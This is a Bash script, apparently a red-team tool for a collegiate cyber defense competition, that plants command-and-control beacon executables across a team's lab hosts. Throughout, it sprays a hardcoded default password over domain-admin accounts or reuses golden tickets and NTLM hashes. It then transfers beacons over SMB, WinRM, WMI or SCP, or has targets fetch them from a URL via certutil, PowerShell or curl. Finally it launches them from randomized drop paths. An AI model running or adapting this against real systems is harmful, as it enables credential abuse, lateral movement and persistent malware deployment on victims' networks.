#!/bin/bash
# ================================================
# CCDC Beacon Planter
# Usage: ./planter.sh <team> [host] [-p pass_or_hash] [-u user] [-w URL] [-x] [-b exe]
#
#   Plants C2 binaries on target(s). By default plants ALL .exe files
#   in CWD (e.g. session.exe + beacon.exe). Use -b to pick one.
#   Auth priority: golden ticket (team<N>.ccache) → -p cred → spray DA list
#   Transfer: SMB put → WMI copy → WinRM upload → certutil from URL → powershell IWR from URL
#   Exec order: SMB → WinRM → WMI → smbexec → SSH (for Linux boxes)
#   Drop paths: random temp name → C:\Windows\Temp → C:\ProgramData → %TEMP%
#
#   host  → hostname, number 1-7, or omit for ALL boxes
#   -p    → password or NTLM hash (overrides golden ticket)
#   -u    → user (default: Administrator)
#   -w    → fallback HTTP URL for beacon download if file transfer fails
#   -b    → specific exe to plant (default: all .exe in CWD)
#   -x    → use internal 172.16.x.x IPs (through proxychains)
# ================================================

set -uo pipefail

usage() {
  echo "Usage: $0 <team> [host] [-p password_or_hash] [-u user] [-w http_url] [-b exe] [-x]"
  echo ""
  echo "  host can be:"
  echo "    hostname  — curiosity, morality, intelligence, anger, fact, space, adventure"
  echo "    number    — 1-7 (or omit to target ALL boxes)"
  echo ""
  echo "Flags:"
  echo "  -p PASS  password or NTLM hash"
  echo "  -u USER  specify user (default: Administrator)"
  echo "  -w URL   fallback HTTP URL to download beacon if file xfer fails"
  echo "  -b EXE   specific binary to plant (default: all .exe in CWD)"
  echo "  -x       use internal 172.16.x.x IPs (via proxychains)"
  echo ""
  echo "Examples:"
  echo "  $0 5                               # plant all .exe on all boxes"
  echo "  $0 5 1                             # plant on curiosity only"
  echo "  $0 5 -b session.exe                # plant only session.exe"
  echo "  $0 5 anger -p Th3cake1salie!"
  echo "  $0 5 -w http://10.0.0.5:8080/b.exe"
  exit 1
}

# ====================== PARSE ARGS ======================
if [[ $# -lt 1 ]]; then usage; fi

TEAM="$1"; shift
if [[ -z "$TEAM" || ! "$TEAM" =~ ^[0-9]+$ ]]; then usage; fi

DOMAIN="aperturesciencelabs.org"
PASS=""
USER_OVERRIDE=""
BEACON_URL=""
TARGET_ARG=""
TIMEOUT=1
USE_INTERNAL=0
SPECIFIC_BIN=""

# Grab optional positional host arg (before flags)
if [[ $# -gt 0 && "$1" != -* ]]; then
  TARGET_ARG="$1"; shift
fi

while getopts "p:u:w:b:x" opt; do
  case "$opt" in
    p) PASS="$OPTARG" ;;
    u) USER_OVERRIDE="$OPTARG" ;;
    w) BEACON_URL="$OPTARG" ;;
    b) SPECIFIC_BIN="$OPTARG" ;;
    x) USE_INTERNAL=1 ;;
    *) usage ;;
  esac
done

# ====================== HOST MAPPING ======================
declare -A NUM_HOST=(
  [1]="curiosity" [2]="morality" [3]="intelligence"
  [4]="anger" [5]="fact" [6]="space" [7]="adventure"
)
declare -A HOST_OCTET=(
  ["curiosity"]=140  ["morality"]=10  ["intelligence"]=11
  ["anger"]=70       ["fact"]=71      ["space"]=141
  ["adventure"]=72
)
declare -A HOST_INTERNAL=(
  ["curiosity"]="172.16.3.140"   ["morality"]="172.16.1.10"
  ["intelligence"]="172.16.1.11" ["anger"]="172.16.2.70"
  ["fact"]="172.16.2.71"         ["space"]="172.16.3.141"
  ["adventure"]="172.16.2.72"
)
HOST_ORDER=(curiosity morality intelligence anger fact space adventure)

# ====================== RESOLVE TARGETS ======================
TARGETS=()
if [[ -z "$TARGET_ARG" ]]; then
  for h in "${HOST_ORDER[@]}"; do
    TARGETS+=("$h")
  done
elif [[ "$TARGET_ARG" =~ ^[1-7]$ ]]; then
  TARGETS+=("${NUM_HOST[$TARGET_ARG]}")
elif [[ -n "${HOST_OCTET[$TARGET_ARG]:-}" ]]; then
  TARGETS+=("$TARGET_ARG")
else
  echo "[-] Unknown host: '$TARGET_ARG'"
  exit 1
fi

# ====================== FIND C2 BINARIES ======================
BEACON_FILES=()
if [[ -n "$SPECIFIC_BIN" ]]; then
  # User specified a particular binary
  if [[ -f "$SPECIFIC_BIN" ]]; then
    BEACON_FILES+=("$SPECIFIC_BIN")
  else
    echo "[-] Specified binary not found: $SPECIFIC_BIN"
    exit 1
  fi
else
  # Default: collect ALL .exe files in CWD
  for f in *.exe; do
    [[ -f "$f" ]] && BEACON_FILES+=("$f")
  done
fi

if [[ ${#BEACON_FILES[@]} -eq 0 ]]; then
  echo "[!] No .exe found in current directory"
  if [[ -z "$BEACON_URL" ]]; then
    echo "[-] No binaries and no -w URL specified. Nothing to plant."
    exit 1
  fi
  echo "[*] Will rely on -w URL download only: $BEACON_URL"
  BEACON_FILES=("beacon.exe")  # placeholder name for URL-only mode
fi

# Globals used by transfer functions — set per-binary in the plant loop
BEACON_FILE=""
BEACON_NAME=""
LAST_XFER=""  # method cache: reuse what worked for previous binary on same host

echo "[+] Binaries: ${BEACON_FILES[*]}"
echo "[+] Targets : ${TARGETS[*]}"

# ====================== AUTH SETUP ======================
# Priority: golden ticket → explicit -p creds → spray DA list
# If golden ticket exists but fails auth, automatically falls back to password spray
DA_USERS=(Administrator caroline cave chell glados wheatley)
TICKET="team${TEAM}.ccache"
USE_KERBEROS=0
AUTH_FLAG=""
SPRAY_MODE=0
FALLBACK_PASS="Th3cake1salie!"

if [[ -z "$PASS" && -f "$TICKET" ]]; then
  echo "[+] Auth   : golden ticket ($TICKET) — will fallback to password spray if ticket fails"
  export KRB5CCNAME="$(pwd)/${TICKET}"
  USE_KERBEROS=1
  [[ -z "$USER_OVERRIDE" ]] && USER_OVERRIDE="Administrator"
elif [[ -n "$PASS" ]]; then
  # Detect hash vs password
  if [[ "$PASS" =~ ^[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?$ ]]; then
    AUTH_FLAG="-H"
    echo "[+] Auth   : hash"
  else
    AUTH_FLAG="-p"
    echo "[+] Auth   : password"
  fi
  [[ -z "$USER_OVERRIDE" ]] && USER_OVERRIDE="Administrator"
else
  echo "[+] Auth   : spray mode (DA accounts + users.txt, default pass)"
  SPRAY_MODE=1
  PASS="$FALLBACK_PASS"
  AUTH_FLAG="-p"
fi

# Build user list for spray mode AND for fallback
ALL_USERS=()
SPRAY_USERS=()

# Always build the spray user list (used as fallback if kerberos fails)
for u in "${DA_USERS[@]}"; do SPRAY_USERS+=("$u"); done
if [[ -f "users.txt" ]]; then
  while IFS= read -r u || [[ -n "$u" ]]; do
    [[ -z "$u" ]] && continue
    already=0
    for da in "${DA_USERS[@]}"; do
      [[ "${u,,}" == "${da,,}" ]] && { already=1; break; }
    done
    [[ $already -eq 0 ]] && SPRAY_USERS+=("$u")
  done < "users.txt"
fi

if [[ $SPRAY_MODE -eq 1 ]]; then
  ALL_USERS=("${SPRAY_USERS[@]}")
  echo "[+] Spray  : ${#ALL_USERS[@]} users"
elif [[ $USE_KERBEROS -eq 1 ]]; then
  ALL_USERS=("$USER_OVERRIDE")
  echo "[+] Fallback users: ${#SPRAY_USERS[@]} (if ticket fails)"
else
  ALL_USERS=("$USER_OVERRIDE")
fi

echo ""

# ====================== HELPERS ======================
declare -A PORT_CACHE
port_open() {
  local ip="$1" port="$2"
  local key="${ip}:${port}"
  if [[ -v PORT_CACHE["$key"] ]]; then
    return ${PORT_CACHE["$key"]}
  fi
  timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
  PORT_CACHE["$key"]=$?
  return ${PORT_CACHE["$key"]}
}

# Generate a random-looking drop path (Windows)
random_drop_path() {
  local rnd=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
  local bases=(
    "C:\\Windows\\Temp\\svc${rnd}.exe"
    "C:\\ProgramData\\${rnd}.exe"
    "C:\\Windows\\System32\\Tasks\\${rnd}.exe"
  )
  echo "${bases[$((RANDOM % ${#bases[@]}))]}"
}

# Guaranteed-writable fallback paths in priority order
SAFE_PATHS=(
  'C:\Windows\Temp'
  'C:\ProgramData'
  '%TEMP%'
)

# ====================== NXC AUTH ARGS ======================
# Builds the auth portion of a netexec command for a given user
nxc_auth() {
  local user="$1"
  if [[ $USE_KERBEROS -eq 1 ]]; then
    echo "-u '$user' -d '$DOMAIN' -k"
  else
    echo "-u '$user' -d '$DOMAIN' $AUTH_FLAG '$PASS'"
  fi
}

# ====================== TRANSFER METHODS ======================
# Each returns 0 on success. They set REMOTE_PATH on success.

REMOTE_PATH=""

# Method 1: SMB put via smbclient then exec
transfer_smb_put() {
  local ip="$1" user="$2" dest="$3"
  [[ -z "$BEACON_FILE" ]] && return 1
  port_open "$ip" 445 || return 1

  local dest_dir dest_base share rel_path
  dest_base="$(basename "$dest")"

  # Try C$ admin share
  if [[ "$dest" == C:\\Windows\\Temp\\* || "$dest" == C:\\ProgramData\\* ]]; then
    rel_path="${dest#C:\\}"
    rel_path="${rel_path//\\/\/}"
    share="C\$"
  else
    share="C\$"
    rel_path="Windows/Temp/${dest_base}"
    dest="C:\\Windows\\Temp\\${dest_base}"
  fi

  local out
  if [[ $USE_KERBEROS -eq 1 ]]; then
    out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k \
      --put-file "$BEACON_FILE" "$rel_path" 2>&1)
  else
    out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" \
      --put-file "$BEACON_FILE" "$rel_path" 2>&1)
  fi

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  return 1
}

# Method 2: WinRM upload + write via PowerShell
transfer_winrm() {
  local ip="$1" user="$2" dest="$3"
  [[ -z "$BEACON_FILE" ]] && return 1
  port_open "$ip" 5985 || return 1

  # base64-encode the file for inline transfer
  local b64
  b64=$(base64 -w0 "$BEACON_FILE" 2>/dev/null || base64 "$BEACON_FILE" 2>/dev/null)
  [[ -z "$b64" ]] && return 1

  # PowerShell to decode and write
  local ps_cmd="[IO.File]::WriteAllBytes('${dest}',[Convert]::FromBase64String('${b64}'))"

  local out
  if [[ $USE_KERBEROS -eq 1 ]]; then
    out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k \
      -X "$ps_cmd" 2>&1)
  else
    out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" \
      -X "$ps_cmd" 2>&1)
  fi

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  return 1
}

# Method 3: Download from URL via certutil (executed over any working proto)
transfer_url_certutil() {
  local ip="$1" user="$2" dest="$3" proto="$4"
  [[ -z "$BEACON_URL" ]] && return 1

  local cmd="certutil -urlcache -split -f \"${BEACON_URL}\" \"${dest}\""
  local out

  case "$proto" in
    smb)
      port_open "$ip" 445 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
      else
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
      fi
      ;;
    winrm)
      port_open "$ip" 5985 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
      else
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
      fi
      ;;
    wmi)
      port_open "$ip" 135 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
      else
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
      fi
      ;;
    *) return 1 ;;
  esac

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  return 1
}

# Method 4: Download from URL via PowerShell IWR
transfer_url_iwr() {
  local ip="$1" user="$2" dest="$3" proto="$4"
  [[ -z "$BEACON_URL" ]] && return 1

  local ps_cmd="powershell -NoP -NonI -c \"IWR -Uri '${BEACON_URL}' -OutFile '${dest}'\""
  local out

  case "$proto" in
    smb)
      port_open "$ip" 445 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$ps_cmd" 2>&1)
      else
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$ps_cmd" 2>&1)
      fi
      ;;
    winrm)
      port_open "$ip" 5985 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -X "$ps_cmd" 2>&1)
      else
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -X "$ps_cmd" 2>&1)
      fi
      ;;
    wmi)
      port_open "$ip" 135 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$ps_cmd" 2>&1)
      else
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$ps_cmd" 2>&1)
      fi
      ;;
    *) return 1 ;;
  esac

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  return 1
}

# ====================== EXECUTE BEACON ======================
exec_beacon() {
  local ip="$1" user="$2" path="$3"
  local cmd="start /b \"\" \"${path}\""
  local out ok=1

  # Try SMB
  if port_open "$ip" 445; then
    if [[ $USE_KERBEROS -eq 1 ]]; then
      out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
    else
      out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
    fi
    echo "$out" | grep -qi '\[+\]' && return 0
  fi

  # Try WinRM
  if port_open "$ip" 5985; then
    if [[ $USE_KERBEROS -eq 1 ]]; then
      out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
    else
      out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
    fi
    echo "$out" | grep -qi '\[+\]' && return 0
  fi

  # Try WMI
  if port_open "$ip" 135; then
    if [[ $USE_KERBEROS -eq 1 ]]; then
      out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
    else
      out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
    fi
    echo "$out" | grep -qi '\[+\]' && return 0
  fi

  # Try smbexec
  local smbexec_bin
  smbexec_bin=$(command -v smbexec.py 2>/dev/null || command -v impacket-smbexec 2>/dev/null || echo "")
  if [[ -n "$smbexec_bin" ]] && port_open "$ip" 445; then
    if [[ "$AUTH_FLAG" == "-H" ]]; then
      out=$("$smbexec_bin" "${DOMAIN}/${user}@${ip}" -hashes "$PASS" -c "$cmd" 2>&1)
    elif [[ $USE_KERBEROS -eq 1 ]]; then
      out=$("$smbexec_bin" "${DOMAIN}/${user}@${ip}" -k -no-pass -c "$cmd" 2>&1)
    else
      out=$("$smbexec_bin" "${DOMAIN}/${user}:${PASS}@${ip}" -c "$cmd" 2>&1)
    fi
    echo "$out" | grep -qiv 'error\|failed\|refused\|denied' && return 0
  fi

  # Try SSH (Linux boxes — just chmod +x and run in bg)
  if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
    local ssh_cmd="chmod +x /tmp/${BEACON_NAME} 2>/dev/null; nohup /tmp/${BEACON_NAME} &>/dev/null &"
    out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$ssh_cmd" 2>&1)
    echo "$out" | grep -qi '\[+\]' && return 0
  fi

  return 1
}

# ====================== TRANSFER + EXEC ONE BINARY ======================
# Called with: transfer_exec_one <ip> <user> <hostname> <authed_proto>
# Uses globals: BEACON_FILE, BEACON_NAME, USE_KERBEROS, AUTH_FLAG, PASS, LAST_XFER
transfer_exec_one() {
  local ip="$1" authed_user="$2" hostname="$3" authed_proto="$4"

  echo "    --- ${BEACON_NAME} ---"

  local rand_path
  rand_path=$(random_drop_path)
  local all_dests=("$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}")

  REMOTE_PATH=""
  local transferred=0

  # Build method order: cached method first → URL-first if -w given → file upload
  local methods=()
  [[ -n "$LAST_XFER" ]] && methods+=("$LAST_XFER")
  if [[ -n "$BEACON_URL" ]]; then
    methods+=(certutil iwr smb_put winrm)
  else
    methods+=(smb_put winrm certutil iwr)
  fi
  [[ "$authed_proto" == "ssh" ]] && methods+=(scp url_ssh)

  # Deduplicate (cached method may already be in the list)
  local seen=() unique=()
  for m in "${methods[@]}"; do
    local dup=0
    for s in "${seen[@]+"${seen[@]}"}"; do [[ "$s" == "$m" ]] && { dup=1; break; }; done
    [[ $dup -eq 0 ]] && { unique+=("$m"); seen+=("$m"); }
  done

  for method in "${unique[@]}"; do
    [[ $transferred -eq 1 ]] && break
    case "$method" in
      smb_put)
        for dest in "${all_dests[@]}"; do
          if transfer_smb_put "$ip" "$authed_user" "$dest"; then
            echo "    [+] Transferred via SMB put → $REMOTE_PATH"
            LAST_XFER="smb_put"; transferred=1; break
          fi
        done ;;
      winrm)
        for dest in "${all_dests[@]}"; do
          if transfer_winrm "$ip" "$authed_user" "$dest"; then
            echo "    [+] Transferred via WinRM upload → $REMOTE_PATH"
            LAST_XFER="winrm"; transferred=1; break
          fi
        done ;;
      certutil)
        [[ -z "$BEACON_URL" ]] && continue
        for dest in "${all_dests[@]}"; do
          for proto in smb winrm wmi; do
            if transfer_url_certutil "$ip" "$authed_user" "$dest" "$proto"; then
              echo "    [+] Transferred via certutil ($proto) → $REMOTE_PATH"
              LAST_XFER="certutil"; transferred=1; break 2
            fi
          done
        done ;;
      iwr)
        [[ -z "$BEACON_URL" ]] && continue
        for dest in "${all_dests[@]}"; do
          for proto in smb winrm wmi; do
            if transfer_url_iwr "$ip" "$authed_user" "$dest" "$proto"; then
              echo "    [+] Transferred via IWR ($proto) → $REMOTE_PATH"
              LAST_XFER="iwr"; transferred=1; break 2
            fi
          done
        done ;;
      scp)
        [[ -z "$BEACON_FILE" ]] && continue
        sshpass -p "$PASS" scp -o StrictHostKeyChecking=no \
          "$BEACON_FILE" "${authed_user}@${ip}:/tmp/${BEACON_NAME}" 2>/dev/null && {
          REMOTE_PATH="/tmp/${BEACON_NAME}"
          echo "    [+] Transferred via SCP → $REMOTE_PATH"
          LAST_XFER="scp"; transferred=1
        } ;;
      url_ssh)
        [[ -z "$BEACON_URL" ]] && continue
        local dl_cmd="curl -sSo /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null || wget -qO /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null"
        netexec ssh "$ip" -u "$authed_user" -p "$PASS" -x "$dl_cmd" 2>/dev/null && {
          REMOTE_PATH="/tmp/${BEACON_NAME}"
          echo "    [+] Transferred via URL download (SSH) → $REMOTE_PATH"
          LAST_XFER="url_ssh"; transferred=1
        } ;;
    esac
  done

  if [[ $transferred -eq 0 ]]; then
    echo "    [-] All transfer methods failed for ${BEACON_NAME}"
    return 1
  fi

  # ---- EXECUTE ----
  if exec_beacon "$ip" "$authed_user" "$REMOTE_PATH"; then
    echo "    [+] LAUNCHED ${BEACON_NAME} on ${hostname}"
    return 0
  else
    echo "    [-] Transfer OK but execution failed for ${BEACON_NAME} on ${hostname}"
    return 1
  fi
}

# ====================== PLANT ALL BINARIES ON ONE HOST ======================
plant_on_host() {
  local hostname="$1"
  local ip
  if [[ $USE_INTERNAL -eq 1 ]]; then
    ip="${HOST_INTERNAL[$hostname]}"
  else
    ip="192.168.20${TEAM}.${HOST_OCTET[$hostname]}"
  fi
  local fqdn="${hostname}.${DOMAIN}"

  echo "  [*] ${hostname} (${ip}) — ${#BEACON_FILES[@]} binary(ies)"

  # Save auth state so kerberos fallback on one host doesn't affect others
  local save_kerberos=$USE_KERBEROS
  local save_auth_flag="$AUTH_FLAG"
  local save_pass="$PASS"

  # Determine authed user — try each until one works
  local authed_user="" authed_proto=""

  for user in "${ALL_USERS[@]}"; do
    for proto in smb winrm wmi; do
      local port
      case "$proto" in
        smb)   port=445 ;;
        winrm) port=5985 ;;
        wmi)   port=135 ;;
      esac
      port_open "$ip" "$port" || continue

      local out
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -k 2>&1)
      else
        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" 2>&1)
      fi

      if echo "$out" | grep -qi '\[+\]'; then
        authed_user="$user"
        authed_proto="$proto"
        break 2
      fi
    done

    # Try SSH
    if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" || $SPRAY_MODE -eq 1 ]]; then
      local out
      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" 2>&1)
      if echo "$out" | grep -qi '\[+\]'; then
        authed_user="$user"
        authed_proto="ssh"
        break
      fi
    fi
  done

  # ---- Kerberos fallback: if ticket auth failed, try password spray ----
  if [[ -z "$authed_user" && $USE_KERBEROS -eq 1 ]]; then
    echo "    [!] Kerberos ticket failed — falling back to password spray"
    for user in "${SPRAY_USERS[@]}"; do
      for proto in smb winrm wmi; do
        local port
        case "$proto" in
          smb)   port=445 ;;
          winrm) port=5985 ;;
          wmi)   port=135 ;;
        esac
        port_open "$ip" "$port" || continue

        local out
        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -p "$FALLBACK_PASS" 2>&1)

        if echo "$out" | grep -qi '\[+\]'; then
          authed_user="$user"
          authed_proto="$proto"
          AUTH_FLAG="-p"
          PASS="$FALLBACK_PASS"
          USE_KERBEROS=0
          break 2
        fi
      done

      if port_open "$ip" 22; then
        local out
        out=$(netexec ssh "$ip" -u "$user" -p "$FALLBACK_PASS" 2>&1)
        if echo "$out" | grep -qi '\[+\]'; then
          authed_user="$user"
          authed_proto="ssh"
          AUTH_FLAG="-p"
          PASS="$FALLBACK_PASS"
          USE_KERBEROS=0
          break
        fi
      fi
    done
  fi

  if [[ -z "$authed_user" ]]; then
    echo "    [-] No valid creds found — skipping"
    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
    return 1
  fi
  echo "    [+] Auth: ${authed_user} via ${authed_proto}"

  # ---- Plant each binary ----
  local planted_count=0
  for bin_file in "${BEACON_FILES[@]}"; do
    BEACON_FILE="$bin_file"
    BEACON_NAME="$(basename "$bin_file")"
    if transfer_exec_one "$ip" "$authed_user" "$hostname" "$authed_proto"; then
      ((planted_count++))
    fi
  done

  # Restore auth state
  USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"

  [[ $planted_count -gt 0 ]] && return 0 || return 1
}

# ====================== MAIN ======================
echo "[*] Planting on team ${TEAM}..."
echo ""

if [[ ${#TARGETS[@]} -eq 1 ]]; then
  # Single target — run directly (no parallel overhead)
  PLANTED=0 FAILED=0
  if plant_on_host "${TARGETS[0]}"; then ((PLANTED++)); else ((FAILED++)); fi
  echo ""
else
  # Multiple targets — run in parallel
  TMPDIR=$(mktemp -d)
  trap 'rm -rf "$TMPDIR"' EXIT
  pids=()

  for host in "${TARGETS[@]}"; do
    (
      plant_on_host "$host" > "${TMPDIR}/${host}.log" 2>&1
      echo $? > "${TMPDIR}/${host}.rc"
    ) &
    pids+=($!)
  done

  echo "[*] ${#TARGETS[@]} hosts running in parallel — waiting..."
  for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null; done
  echo ""

  # Print collected output and tally results
  PLANTED=0 FAILED=0
  for host in "${TARGETS[@]}"; do
    cat "${TMPDIR}/${host}.log"
    echo ""
    rc=$(cat "${TMPDIR}/${host}.rc" 2>/dev/null || echo 1)
    if [[ $rc -eq 0 ]]; then ((PLANTED++)); else ((FAILED++)); fi
  done
fi

echo "=========================================="
echo "[*] Results: ${PLANTED} host(s) planted, ${FAILED} failed out of ${#TARGETS[@]} targets"
if [[ $PLANTED -gt 0 ]]; then
  echo "[+] Check your C2 console for new callbacks."
fi